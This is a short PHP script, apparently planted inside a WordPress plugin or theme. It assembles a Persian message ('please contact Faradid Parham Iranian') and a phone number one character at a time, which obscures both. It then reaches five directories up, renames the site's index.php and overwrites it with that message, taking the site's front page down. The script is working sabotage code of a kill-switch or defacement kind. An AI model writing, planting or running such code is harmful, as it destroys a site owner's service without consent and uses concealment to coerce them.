<?php
$a = "ل";
$a = $a."ط";
$a = $a."ف";
$a = $a."ا";
$a = $a." ";
$a = $a."ب";
$a = $a."ا";
$a = $a."ش";
$a = $a."ر";
$a = $a."ک";
$a = $a."ت";
$a = $a." ";
$a = $a."ف";
$a = $a."ر";
$a = $a."ا";
$a = $a."د";
$a = $a."ی";
$a = $a."د";
$a = $a." ";
$a = $a."پ";
$a = $a."ر";
$a = $a."ه";
$a = $a."ا";
$a = $a."م";
$a = $a." ";
$a = $a."ا";
$a = $a."ی";
$a = $a."ر";
$a = $a."ا";
$a = $a."ن";
$a = $a."ی";
$a = $a."ا";
$a = $a."ن";
$a = $a." ";
$a = $a."ت";
$a = $a."م";
$a = $a."ا";
$a = $a."س";
$a = $a." ";
$a = $a."ب";
$a = $a."گ";
$a = $a."ی";
$a = $a."ر";
$a = $a."ی";
$a = $a."د";
$b= "0";
$b = $b."2";
$b = $b."6";
$b = $b."3";
$b = $b."2";
$b = $b."5";
$b = $b."0";
$b = $b."2";
$b = $b."8";
$b = $b."2";
$b = $b."2";

// var_dump($a);
// die();
//  echo "../../../../../".__DIR__;
//  $upOne = dirname(__DIR__, 5);
//  var_dump($upOne);
 $path =  "../../../../../index.php";
 rename($path,"../../../../../oldindex.php");
//  $myfile = fopen($path, "w");
 $myfile = fopen($path, "w") or die("Unable to open file!");
 $txt = "{$a}.\n";
 fwrite($myfile, $txt);
 $txt = "{$b}\n";
 fwrite($myfile, $txt);
 fclose($myfile); 
$filecontent = "<?php\n
/**\n
 * Front to the WordPress application. This file doesn't do anything, but loads\n
 * wp-blog-header.php which does and tells WordPress to load the theme.\n
 *\n
 * @package WordPress\n
 */\n
 \n
/**\n
 * Tells WordPress to load the WordPress theme and output it.\n
 *\n
 * @var bool\n
 */\n
define( 'WP_USE_THEMES', true );\n
\n
/** Loads the WordPress Environment and Template */\n
require __DIR__ . '/wp-blog-header.php';\n";

?>